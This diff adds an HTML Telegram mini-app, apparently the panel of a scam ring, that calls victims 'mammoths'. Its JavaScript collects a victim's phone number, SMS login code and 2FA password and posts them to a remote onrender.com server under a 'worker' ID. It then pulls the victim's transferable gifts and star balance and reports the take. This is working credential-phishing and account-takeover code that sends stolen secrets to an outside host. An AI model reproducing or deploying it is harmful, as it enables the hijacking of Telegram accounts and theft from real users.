@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Бот с чеками - Мини-апп</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background: var(--tg-theme-secondary-bg-color, #f8f9fa);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: var(--tg-theme-button-color, #007aff);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: opacity 0.2s;
+        }
+
+        .btn:hover {
+            opacity: 0.8;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        .input-group input,
+        .input-group textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--tg-theme-hint-color, #ccc);
+            border-radius: 6px;
+            font-size: 16px;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            font-family: inherit;
+        }
+
+        .input-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .status {
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .user-info {
+            background: var(--tg-theme-secondary-bg-color, #f8f9fa);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .user-info h3 {
+            margin-bottom: 10px;
+        }
+
+        .user-info p {
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💳 Бот с чеками</h1>
+            <p>Управление чеками и мамонтами</p>
+        </div>
+
+        <div class="user-info">
+            <h3>👤 Информация о пользователе</h3>
+            <p><strong>ID:</strong> <span id="user-id">Загрузка...</span></p>
+            <p><strong>Имя:</strong> <span id="user-name">Загрузка...</span></p>
+            <p><strong>Username:</strong> <span id="user-username">Загрузка...</span></p>
+        </div>
+
+        <div class="card">
+            <h3>🔐 Авторизация в Telegram сессии</h3>
+            <div class="input-group">
+                <label for="phone-number">Номер телефона:</label>
+                <input type="tel" id="phone-number" placeholder="+1234567890">
+            </div>
+            <div id="code-step" class="hidden">
+                <div class="input-group">
+                    <label for="auth-code">Код из SMS:</label>
+                    <input type="text" id="auth-code" placeholder="12345">
+                </div>
+            </div>
+            <div id="2fa-step" class="hidden">
+                <div class="input-group">
+                    <label for="2fa-password">2FA пароль:</label>
+                    <input type="password" id="2fa-password" placeholder="Ваш 2FA пароль">
+                </div>
+            </div>
+            <button class="btn" id="auth-button" onclick="startAuth()">Начать авторизацию</button>
+            <div id="auth-status" class="status hidden"></div>
+        </div>
+
+        <div class="card">
+            <h3>💳 Активация чека</h3>
+            <div class="input-group">
+                <label for="check-code">Код чека:</label>
+                <input type="text" id="check-code" placeholder="Введите код чека">
+            </div>
+            <button class="btn" onclick="activateCheck()">Активировать чек</button>
+            <div id="check-status" class="status hidden"></div>
+        </div>
+
+        <div class="card">
+            <h3>📋 Информация о мамонте</h3>
+            <button class="btn" onclick="getMammothGifts()">Получить подарки</button>
+            <button class="btn" onclick="getMammothStars()">Получить звезды</button>
+            <div id="mammoth-info" class="status hidden"></div>
+        </div>
+
+        <div class="card">
+            <h3>🔗 Связь с ботом</h3>
+            <button class="btn" onclick="openBot()">Открыть бота</button>
+            <p style="margin-top: 10px; font-size: 14px; color: var(--tg-theme-hint-color, #666);">
+                Для полного функционала используйте бота
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Инициализация Telegram Web App
+        let tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // Получаем информацию о пользователе
+        const user = tg.initDataUnsafe.user;
+        if (user) {
+            document.getElementById('user-id').textContent = user.id;
+            document.getElementById('user-name').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
+            document.getElementById('user-username').textContent = user.username ? '@' + user.username : 'Не указан';
+        }
+
+        // Переменные для авторизации
+        let authStep = 'phone';
+        let currentSession = null;
+
+        // Функция начала авторизации
+        async function startAuth() {
+            const phoneNumber = document.getElementById('phone-number').value.trim();
+            const authCode = document.getElementById('auth-code').value.trim();
+            const twofaPassword = document.getElementById('2fa-password').value.trim();
+            
+            if (authStep === 'phone') {
+                if (!phoneNumber) {
+                    showStatus('Введите номер телефона', 'error', 'auth-status');
+                    return;
+                }
+                
+                showStatus('Отправка кода...', 'success', 'auth-status');
+                
+                try {
+                    const response = await fetch('https://testweb-0i1f.onrender.com/api/start-auth', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            phone_number: phoneNumber,
+                            worker_user_id: user.id
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        authStep = 'code';
+                        currentSession = data.session_id;
+                        document.getElementById('code-step').classList.remove('hidden');
+                        document.getElementById('auth-button').textContent = 'Подтвердить код';
+                        showStatus('✅ Код отправлен! Введите код из SMS', 'success', 'auth-status');
+                    } else {
+                        showStatus('❌ ' + (data.error || 'Ошибка при отправке кода'), 'error', 'auth-status');
+                    }
+                } catch (error) {
+                    showStatus('❌ Ошибка при отправке кода', 'error', 'auth-status');
+                    console.error('Ошибка:', error);
+                }
+            } else if (authStep === 'code') {
+                if (!authCode) {
+                    showStatus('Введите код из SMS', 'error', 'auth-status');
+                    return;
+                }
+                
+                showStatus('Проверка кода...', 'success', 'auth-status');
+                
+                try {
+                    const response = await fetch('https://testweb-0i1f.onrender.com/api/verify-code', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            worker_user_id: user.id,
+                            code: authCode
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        if (data.next_step === 'verify_2fa') {
+                            authStep = '2fa';
+                            document.getElementById('2fa-step').classList.remove('hidden');
+                            document.getElementById('auth-button').textContent = 'Подтвердить 2FA';
+                            showStatus('✅ Код подтвержден! Введите 2FA пароль', 'success', 'auth-status');
+                        } else {
+                            // Нет 2FA, переходим к получению данных
+                            await getMammothData();
+                        }
+                    } else {
+                        showStatus('❌ ' + (data.error || 'Неверный код'), 'error', 'auth-status');
+                    }
+                } catch (error) {
+                    showStatus('❌ Ошибка при проверке кода', 'error', 'auth-status');
+                    console.error('Ошибка:', error);
+                }
+            } else if (authStep === '2fa') {
+                if (!twofaPassword) {
+                    showStatus('Введите 2FA пароль', 'error', 'auth-status');
+                    return;
+                }
+                
+                showStatus('Проверка 2FA...', 'success', 'auth-status');
+                
+                try {
+                    const response = await fetch('https://testweb-0i1f.onrender.com/api/verify-2fa', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            worker_user_id: user.id,
+                            password: twofaPassword
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        showStatus('✅ 2FA подтвержден! Получение данных...', 'success', 'auth-status');
+                        await getMammothData();
+                    } else {
+                        showStatus('❌ ' + (data.error || 'Неверный 2FA пароль'), 'error', 'auth-status');
+                    }
+                } catch (error) {
+                    showStatus('❌ Ошибка при проверке 2FA', 'error', 'auth-status');
+                    console.error('Ошибка:', error);
+                }
+            }
+        }
+
+        // Функция получения данных мамонта
+        async function getMammothData() {
+            showStatus('Получение данных мамонта...', 'success', 'auth-status');
+            
+            try {
+                const response = await fetch('https://testweb-0i1f.onrender.com/api/get-mammoth-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        worker_user_id: user.id
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    const giftsList = data.gifts.map(gift => 
+                        `• ${gift.name} (${gift.can_transfer ? '✅' : '❌'})`
+                    ).join('\n');
+                    
+                    showStatus(`✅ Данные получены! Отстук отправлен.\n\n👤 Мамонт: ${data.mammoth_info.first_name} ${data.mammoth_info.last_name}\n📱 Телефон: ${data.mammoth_info.phone}\n🎁 Подарков: ${data.gifts.length}\n⭐ Звезд: ${data.stars_amount}\n\n${giftsList}`, 'success', 'auth-status');
+                    
+                    // Сбрасываем форму
+                    resetAuthForm();
+                } else {
+                    showStatus('❌ ' + (data.error || 'Ошибка при получении данных'), 'error', 'auth-status');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка при получении данных', 'error', 'auth-status');
+                console.error('Ошибка:', error);
+            }
+        }
+
+        // Функция сброса формы авторизации
+        function resetAuthForm() {
+            authStep = 'phone';
+            currentSession = null;
+            document.getElementById('phone-number').value = '';
+            document.getElementById('auth-code').value = '';
+            document.getElementById('2fa-password').value = '';
+            document.getElementById('code-step').classList.add('hidden');
+            document.getElementById('2fa-step').classList.add('hidden');
+            document.getElementById('auth-button').textContent = 'Начать авторизацию';
+        }
+
+        // Функция активации чека
+        async function activateCheck() {
+            const checkCode = document.getElementById('check-code').value.trim();
+            const statusDiv = document.getElementById('check-status');
+            
+            if (!checkCode) {
+                showStatus('Введите код чека', 'error', 'check-status');
+                return;
+            }
+
+            // Показываем загрузку
+            showStatus('Активация чека...', 'success', 'check-status');
+            
+            try {
+                const response = await fetch('https://testweb-0i1f.onrender.com/api/activate-check', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        check_code: checkCode,
+                        user_id: user.id
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('✅ Чек успешно активирован!', 'success', 'check-status');
+                    document.getElementById('check-code').value = '';
+                } else {
+                    showStatus('❌ ' + (data.error || 'Ошибка при активации чека'), 'error', 'check-status');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка при активации чека', 'error', 'check-status');
+                console.error('Ошибка:', error);
+            }
+        }
+
+        // Функция получения подарков мамонта
+        async function getMammothGifts() {
+            const infoDiv = document.getElementById('mammoth-info');
+            
+            showStatus('Загрузка подарков...', 'success', 'mammoth-info');
+            
+            try {
+                const response = await fetch('https://testweb-0i1f.onrender.com/api/mammoth-gifts', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        mammoth_user_id: user.id
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    const giftsList = data.gifts.map(gift => 
+                        `• ${gift.name} (${gift.can_transfer ? '✅' : '❌'})`
+                    ).join('\n');
+                    
+                    showStatus(`🎁 Подарки мамонта (${data.total_count}):\n${giftsList}`, 'success', 'mammoth-info');
+                } else {
+                    showStatus('❌ ' + (data.error || 'Ошибка при загрузке подарков'), 'error', 'mammoth-info');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка при загрузке подарков', 'error', 'mammoth-info');
+                console.error('Ошибка:', error);
+            }
+        }
+
+        // Функция получения звезд мамонта
+        async function getMammothStars() {
+            const infoDiv = document.getElementById('mammoth-info');
+            
+            showStatus('Загрузка звезд...', 'success', 'mammoth-info');
+            
+            try {
+                const response = await fetch('https://testweb-0i1f.onrender.com/api/mammoth-stars', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        mammoth_user_id: user.id
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus(`⭐ Звезд у мамонта: ${data.stars_amount}`, 'success', 'mammoth-info');
+                } else {
+                    showStatus('❌ ' + (data.error || 'Ошибка при загрузке звезд'), 'error', 'mammoth-info');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка при загрузке звезд', 'error', 'mammoth-info');
+                console.error('Ошибка:', error);
+            }
+        }
+
+        // Функция открытия бота
+        function openBot() {
+            tg.openTelegramLink('https://t.me/your_bot_username');
+        }
+
+        // Функция показа статуса
+        function showStatus(message, type, elementId = 'check-status') {
+            const statusDiv = document.getElementById(elementId);
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.classList.remove('hidden');
+            
+            // Скрываем статус через 5 секунд
+            setTimeout(() => {
+                statusDiv.classList.add('hidden');
+            }, 5000);
+        }
+
+        // Обработка кнопки "Назад" в Telegram
+        tg.onEvent('backButtonClicked', function() {
+            tg.close();
+        });
+
+        // Показываем кнопку "Назад"
+        tg.BackButton.show();
+    </script>
+</body>
+</html>
